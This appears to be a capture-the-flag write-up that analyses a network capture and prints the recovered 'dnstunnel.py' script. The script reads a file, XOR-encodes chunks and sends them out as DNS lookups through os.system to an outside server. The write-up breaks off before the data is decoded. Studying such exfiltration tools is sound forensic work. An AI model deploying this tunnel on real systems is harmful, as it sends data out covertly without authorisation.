# Old EXFIL but Gold

### SUBJECT

Nous soupçonnons une exfiltration de données.  
Nous avons capturé des données réseaux, à vous d'extraire le lien pour la prochaine étape !

We suspect data exfiltration.  
We have captured network data, it's up to you to extract the link for the next step !

### EXPLORING THE .PCAP
On the challenge page, we download a `.pcap` file.  
First reflex, open it in Wireshark in order to inspect its content.  

![ch02 Wireshark](/images/ch02-wireshark.png)

This file contains a record of network frames at a certain time.  
We can quickly isolate 3 different protocols:  
- TCP
- HTTP
- DNS

These protocols will be useful for us because their functions and uses allow certain processes that we will discover later.  

The HTTP packets being in clear, we filter them and analyze their contents.  

![ch02 http filter](/images/ch02-httpfilter.png)

We can observe that in the infos, there are two requests of type `GET` sending from the source, then completed by the various TCP packets containing the response, followed (if all went well) by an HTTP 200 OK packet from the destination.
The first request ask for the page `/index.html`, constituted as below (after extracting the source code contained in clear in the request):

---

> Code

![ch02 index.html code](/images/ch02-indexhtmlraw.png)

> Rendering

![ch02 index.html](/images/ch02-indexhtml.png)

---

Given the following request, we can imagine that the attacker then downloaded the `dnstunnel.py` file.  
The advantage of HTTP being for us that the request is in clear, we have the possibility of seeing the content of this file and therefore the source code.  

![ch02 python code](/images/ch02-pythoncode.png)

We extract it and paste it into our favorite IDE to inspect the code and continue our journey.  

### READING AND UNDERSTANDING CODE

Here is the code we have in our hands :  

```python
#!/usr/bin/python3 
# I have no idea of what I'm doing 
 
#Because why not! 
import random 
import os 
 
f = open('data.txt','rb') 
data = f.read() 
f.close()

print("[+] Sending %d bytes of data" % len(data)) 

#This is propa codaz 
print("[+] Cut in pieces ... ") 

def encrypt(l): 
    #High quality cryptographer! 
    key = random.randint(13,254) 
    output = hex(key)[2:].zfill(2)
    for i in range(len(l)): 
        aes = ord(l[i]) ^ key 
        #my computer teacher hates me 
        output += hex(aes)[2:].zfill(2) 
    return output 

def udp_secure_tunneling(my_secure_data): 
    #Gee, I'm so bad at coding 
    #if 0: 
    mycmd = "host -t A %s.local.tux 172.16.42.222" % my_secure_data 
    os.system(mycmd) 
    #We loose packet sometimes? 
    os.system("sleep 1") 
    #end if 

def send_data(s): 
    #because I love globals 
    global n 
    n = n+1 
    length = random.randint(4,11) 
    # If we send more bytes we can recover if we loose some packets? 
    redundancy = random.randint(2,16) 
    chunk = data[s:s+length+redundancy].decode("utf-8") 
    chunk = "%04d%s"%(s,chunk) 
    print("%04d packet --> %s.local.tux" % (n,chunk)) 
    blob = encrypt(chunk) 
    udp_secure_tunneling(blob) 
    return s + length 
 
cursor = 0 
n=0 
while cursor<len(data): 
    cursor = send_data(cursor) 
 
#Is it ok? 
```

_Continued write-up tomorrow, 'going to sleep.._
